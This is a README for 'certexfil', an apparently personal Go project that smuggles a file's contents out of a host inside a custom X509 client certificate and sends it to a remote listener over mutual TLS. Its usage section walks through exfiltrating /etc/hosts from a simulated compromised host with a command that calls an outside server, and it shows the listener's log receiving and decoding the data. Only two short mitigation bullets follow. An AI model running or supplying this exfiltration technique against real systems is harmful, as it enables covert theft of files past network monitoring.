# Exfiltration fun using X509 digital certificates

## Overview

I spend a ton of time on exfiltration topics and mitigation techniques. This is my very first attempt to try to learn Go by having a quick way to convert a payload (reading a file) and building it as part as a custom x509 digital certificate.

If you new to playing with certs, you will find the following interesting links that inspired me (must read first):

* https://medium.com/sitewards/the-magic-of-tls-x509-and-mutual-authentication-explained-b2162dec4401
* https://venilnoronha.io/a-step-by-step-guide-to-mtls-in-go
* https://tools.ietf.org/html/draft-ietf-oauth-mtls-14

Certexfil has two components, a client and a listener:

* The client is used to bootstrap and set a CA to create certificates (and authenticate them later)
* The client is used also to embed a payload (file) into a new client certificate then use mTLS against a listener service
* A listener (remote) service which using a certificate is accepting valid mTLS clients

## Usage

### Create CA and prepare your listener

This is to create server_cert.pem and server_key.pem certificates to be used for mTLS (client and listener will use those:

```
somewhere$ certexfil.client -ca -ecdsa-curve P521
```

Now make sure your have binary certexfil.listener and the new ./CERTS directory on your remote server. Then, run the listener:

```
remoteserver$ ./certexfil.listener
```

### Client or (simulated) compromised host

In this example, lets try to exfiltrate our /etc/hosts file by generating a custom cert and establishing a mTLS connection to our remote listener:

```
host$ certexfil.client  -host x.io.net -payload /etc/hosts
2019/05/10 19:33:13 Reading from file..
2019/05/10 19:33:13 Payload  --> 127.0.0.1	...	(225 bytes)
2019/05/10 19:33:13 PayloadPrepared --> �...		(173 bytes)
2019/05/10 19:33:13 wrote cert
2019/05/10 19:33:13 wrote cert key
```

### Seen on the listener

```
remoteserver$ certexfil.listener 
2019/05/10 23:33:14 received:	H4sIAAAAAAAC/0TNMa7DIAwG4DmcwtKbH4IMqcQNunXoBQgxDaoDCJOmx69o08abP1v/r/uTVFJJ3VFylubEVXxMS91tIVYsy1pRiD+4zgg+EaUtxBtQiMhgC8KEHIodqV0LnC+PAZzNb2h5LIzR0Cbk4f9Xs28pj9bdhUeljFHHS8QqvD9wcZZrLujDs3nfMptbopgm5B37L5a0ViwsXgEAAP//pJPCNuEAAAA=
2019/05/10 23:33:14 PayloadRetrieved -->
127.0.0.1	localhost
127.0.1.1	wintermute

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
<--
```

## Mitigations

* Fresh certificates
* Large payload vs average certificates from same client (a decent firewall should be able to help)

## Todo

* Peer-review from a real Go developper.. I should stick to Python, I know.
* Set a DEBUG option, clean code
* merge client/listener in one
* automatic deployment of generated certs (DNS TXT? :P)
* Actually have crypto in cryptopayload module

## Contact

* @Sourcefrenchy
